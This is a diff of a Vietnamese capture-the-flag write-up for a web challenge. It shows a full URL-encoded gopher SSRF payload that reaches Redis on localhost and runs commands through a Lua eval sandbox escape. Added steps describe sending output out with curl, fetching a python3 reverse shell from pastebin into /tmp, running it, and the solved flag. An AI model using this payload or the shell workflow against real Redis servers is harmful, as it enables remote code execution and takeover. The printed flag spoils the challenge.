@@ -290,10 +290,17 @@ eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "
 
 Đấm vào gopher và url encode thôi:
 ```
-gopher://127.0.0.1:6379/_eval%20%27local%20io_l%20%3D%20package.loadlib%28%22%2Fusr%2Flib%2Fx86_64-linux-gnu%2Fliblua5.1.so.0%22%2C%20%22luaopen_io%22%29%3B%20local%20io%20%3D%20io_l%28%29%3B%20local%20f%20%3D%20io.popen%28%22cat%20/root/flag.txt%22%2C%20%22r%22%29%3B%20local%20res%20%3D%20f%3Aread%28%22%2Aa%22%29%3B%20f%3Aclose%28%29%3B%20return%20res%27%200
+gopher://127.0.0.1:6379/_eval%20%27local%20io_l%20%3D%20package.loadlib%28%22%2Fusr%2Flib%2Fx86_64-linux-gnu%2Fliblua5.1.so.0%22%2C%20%22luaopen_io%22%29%3B%20local%20io%20%3D%20io_l%28%29%3B%20local%20f%20%3D%20io.popen%28%22INJECT_COMMAND_HERE%22%2C%20%22r%22%29%3B%20local%20res%20%3D%20f%3Aread%28%22%2Aa%22%29%3B%20f%3Aclose%28%29%3B%20return%20res%27%200
 ```
 
-**flag**: `pass`
+Vì có lẽ intent của bài là RCE nên không có chuyện đọc được flag qua SSRF dễ dàng mà phải RCE. Sau khi RCE được thử curl và dùng `backtick` để thực thi command gửi ra bên ngoài, thử `ls -la /|base64` mà không thấy flag đâu nên quyết định lấy Shell luôn.
+	
+1. `which python3`: có python3
+2. revshells.com -> python3 payload --> host payload vào pastebin raw --> curl đến lưu vào `/tmp/shell.py`
+3. `python3 /tmp/shell.py` --> SHELL
+4. Chạy `/readflag` thì ta lấy được flag, có lẽ lúc send output bằng curl dù đã base64 encode mà vẫn không đọc được hết output nên không tìm thấy
+	
+**flag**: `d_h4nd5_t0_th3_r3disland!}`
 
 ## Genesis Wallet
 **Write up**: https://h1pmnh.github.io/post/ctf-htb-cyber-apolcalypse-web-genesis-wallet/
